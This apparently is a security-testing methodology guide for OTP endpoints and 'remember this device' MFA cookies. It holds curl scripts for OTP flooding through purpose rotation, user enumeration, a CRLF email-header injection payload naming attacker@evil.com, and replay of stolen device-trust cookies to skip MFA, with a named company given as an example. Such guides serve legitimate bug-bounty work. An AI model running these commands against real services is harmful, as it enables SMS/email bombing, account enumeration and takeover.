# OTP Endpoint Testing

When targets have OTP/2FA endpoints (send_otp, verify_otp, resend_otp), these are often testable WITHOUT authentication and yield Medium-severity findings.

## Discovery

OTP endpoints are commonly found at:
- `/api/v1/send_otp`
- `/api/v1/resend_otp`
- `/api/v1/verify_otp`
- `/auth/otp/send`
- `/users/send-verification`
- `/forgot_password` (triggers OTP/email)

## Testing Checklist

### 1. Rate Limit Testing (per-endpoint)
```bash
for i in $(seq 1 10); do
  curl -sk -X POST "$TARGET/api/v1/send_otp" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","purpose":"login"}' \
    -o /dev/null -w "%{http_code} " 2>/dev/null
done
```
- Note where rate limit kicks in (which request #)
- Note the cooldown period (from error message)

### 2. Rate Limit Bypass via Purpose/Type Rotation
Many implementations rate-limit per-purpose rather than per-recipient. Test:
```bash
# After hitting rate limit on one purpose, try others
PURPOSES=("login" "signup" "forgot_password" "reset_password" "withdrawal" "verify_email" "verify_phone")
for purpose in "${PURPOSES[@]}"; do
  curl -sk -X POST "$TARGET/api/v1/send_otp" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@email.com\",\"purpose\":\"$purpose\"}" \
    -w " [%{http_code}]" 2>/dev/null
  echo ""
done
```
**Finding pattern:** If different purposes succeed after one is rate-limited → OTP flooding via purpose rotation (Medium severity).

**Impact calculation:** (requests before limit) × (number of valid purposes) = total OTPs per burst. Multiply by (60 / cooldown_minutes) for hourly rate.

### 3. User Enumeration via Response Differentiation
Compare responses for existing vs non-existing users:
```bash
# Test forgot_password (commonly leaks user existence)
curl -sk -X POST "$TARGET/api/v1/forgot_password" \
  -H "Content-Type: application/json" \
  -d '{"email":"definitely-not-a-user-xyz@gmail.com"}'

# Compare with likely-valid email (support@, admin@, info@)
curl -sk -X POST "$TARGET/api/v1/forgot_password" \
  -H "Content-Type: application/json" \
  -d '{"email":"support@target.com"}'
```
**Finding pattern:** Different error messages (e.g., "not_found" vs success) = user enumeration (Low severity).

**Note:** `send_otp` often returns "success" for all inputs (good design). But `forgot_password` frequently leaks existence.

### 4. Email Header Injection (CRLF in email field)
```bash
curl -sk -X POST "$TARGET/api/v1/send_otp" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com%0d%0aCc:attacker@evil.com","purpose":"login"}'
```
If response is "success" — may indicate injection (but hard to confirm without receiving the email). Document as potential finding, note verification limitation.

### 5. OTP to Arbitrary Recipients
```bash
# Test if OTP can be sent to any email (even non-registered)
curl -sk -X POST "$TARGET/api/v1/send_otp" \
  -H "Content-Type: application/json" \
  -d '{"email":"notavalidemail","purpose":"login"}'
```
If "success" for invalid emails → endpoint doesn't validate user existence (prevents enumeration but enables spam).

### 6. Phone Number Parameter Discovery
```bash
# Some endpoints accept phone alongside email
curl -sk -X POST "$TARGET/api/v1/send_otp" \
  -H "Content-Type: application/json" \
  -d '{"phone":"+919999999999","purpose":"login"}'

curl -sk -X POST "$TARGET/api/v1/send_otp" \
  -H "Content-Type: application/json" \
  -d '{"email":"","purpose":"login"}'
# Empty email may reveal: "Phone number can't be blank" → confirms phone param exists
```

### 7. Timing-Based User Enumeration
```bash
# Compare response times for existing vs non-existing users
for email in "nonexistent-xyz@proton.me" "support@target.com"; do
  time_total=$(curl -sk -X POST "$TARGET/api/v1/send_otp" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"purpose\":\"login\"}" \
    -o /dev/null -w "%{time_total}" 2>/dev/null)
  echo "$email: ${time_total}s"
done
```
Significant timing difference (>50ms consistently) = timing-based enumeration.

## Severity Guidelines

| Finding | Severity | Rationale |
|---------|----------|-----------|
| Rate limit bypass (purpose rotation) → OTP flooding | Medium (5.3) | DoS via email/SMS bombing, cost amplification |
| No rate limit at all on OTP endpoint | Medium (5.3) | Enables brute-force + flooding |
| User enumeration via forgot_password | Low (3.7) | Facilitates targeted attacks |
| OTP to arbitrary recipients (spam) | Low (3.0) | Cost amplification, reputation damage |
| Email header injection confirmed | Medium (5.4) | Phishing via trusted domain |
| Timing-based user enumeration | Low (3.1) | Requires statistical analysis |

## Real-World Example (CoinDCX, May 2026)

- `/api/v1/send_otp` rate limit: ~3 requests per purpose before 422
- 4 valid purposes: login, forgot_password, reset_password, withdrawal
- Result: 12-20 OTPs to same victim per burst, repeatable every 5 minutes
- `/api/v1/forgot_password` returns `"not_found"` for non-existent users (enumeration)
- `send_otp` returns "success" for all inputs including invalid emails (no enumeration — good)
- Empty email reveals: `"Phone number can't be blank"` (parameter discovery)

## Key Insight

OTP endpoints are often overlooked because testers assume they need an account. In reality:
- `send_otp` is almost always unauthenticated (it's the PRE-auth step)
- Rate limit testing requires no account
- Purpose enumeration requires no account
- User enumeration via forgot_password requires no account
- These are quick wins (5-10 minutes) that produce Medium-severity findings

## Device Trust Cookie Theft (MFA Bypass)

When applications implement "Remember this device" / "Trust this browser" functionality, they issue a device trust cookie that bypasses MFA on subsequent logins. If this cookie is not properly bound to the user's context, it can be stolen and replayed.

### How Device Trust Works

```
First login: username + password + OTP → Set-Cookie: device_trust=<token>; Max-Age=2592000
Subsequent logins: username + password + device_trust cookie → MFA SKIPPED
```

### Attack Vectors

| Vector | Technique | Prerequisite |
|---|---|---|
| XSS | Steal device_trust cookie via `document.cookie` | XSS on same domain, cookie not httpOnly |
| CORS | Cross-origin request with credentials leaks cookie value | CORS misconfiguration |
| Network sniff | Intercept cookie on HTTP (non-HTTPS) request | Mixed content or HTTP fallback |
| Subdomain takeover | Set cookie from taken-over subdomain | Dangling CNAME on same parent domain |
| Session fixation | Pre-set device_trust cookie before victim authenticates | Cookie not regenerated on login |

### Testing Checklist

```bash
# 1. Identify the device trust cookie
# Login with MFA, check "Remember this device", inspect Set-Cookie headers
curl -sk -D- -X POST "https://target.com/api/auth/login" \
  -d '{"username":"user","password":"pass","otp":"123456","remember_device":true}' | grep -i set-cookie

# 2. Check cookie attributes
# Look for: HttpOnly, Secure, SameSite, Domain, Path, Max-Age
# FINDING if: missing HttpOnly (stealable via XSS)
# FINDING if: missing Secure (sent over HTTP)
# FINDING if: Domain=.parent.com (accessible from any subdomain)
# FINDING if: Max-Age > 30 days (excessive trust window)

# 3. Test if cookie is bound to IP
# Replay the device_trust cookie from a different IP
curl -sk -X POST "https://target.com/api/auth/login" \
  -H "Cookie: device_trust=STOLEN_TOKEN" \
  -d '{"username":"victim","password":"known_pass"}'
# If login succeeds without MFA → NOT bound to IP (finding)

# 4. Test if cookie is bound to User-Agent
# Replay with different User-Agent
curl -sk -X POST "https://target.com/api/auth/login" \
  -H "Cookie: device_trust=STOLEN_TOKEN" \
  -H "User-Agent: DifferentBrowser/1.0" \
  -d '{"username":"victim","password":"known_pass"}'
# If login succeeds without MFA → NOT bound to UA (finding)

# 5. Test if cookie is bound to user
# Use victim's device_trust cookie with attacker's credentials
curl -sk -X POST "https://target.com/api/auth/login" \
  -H "Cookie: device_trust=VICTIMS_TOKEN" \
  -d '{"username":"attacker","password":"attacker_pass"}'
# If attacker's login skips MFA → cookie not user-bound (Critical)

# 6. Test cookie expiration
# Check if cookie is invalidated after password change
# Login → get device_trust → change password → try device_trust again
```

### Severity Classification

| Scenario | Severity | Rationale |
|---|---|---|
| Cookie not bound to user (any user can use any device_trust) | Critical | Complete MFA bypass for any account |
| Cookie not bound to IP + stealable (no httpOnly) | High | XSS → MFA bypass chain |
| Cookie not bound to IP but httpOnly | Medium | Requires network-level attack to steal |
| Cookie survives password change | High | Persistent access after credential rotation |
| Excessive Max-Age (>90 days) | Low | Extended attack window but not a bypass alone |

### Reporting Template

```markdown
## [FINDING-N] Device Trust Cookie Bypasses MFA

**Severity:** High
**CVSS 3.1:** 7.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Description
The "Remember this device" functionality issues a `device_trust` cookie that is not
bound to [IP/User-Agent/specific user]. An attacker who obtains this cookie (via XSS,
network interception, or subdomain takeover) can bypass MFA for the victim's account.

### Steps to Reproduce
1. Login as victim with MFA, enable "Remember this device"
2. Extract device_trust cookie value
3. From a different [IP/browser/machine], send login request with stolen cookie
4. Observe: MFA challenge is skipped

### Impact
Complete bypass of MFA protection. Combined with credential stuffing or phishing
(password-only), enables full account takeover without the second factor.
```

### Chain Opportunities

- **XSS + Device Trust** → Steal cookie via XSS, replay for MFA bypass (Low XSS → High ATO)
- **CORS + Device Trust** → Cross-origin credential request leaks cookie
- **Subdomain Takeover + Device Trust** → Set/read cookie from taken-over subdomain
- **CTI Credentials + Device Trust** → Breached password + stolen device cookie = full access without MFA
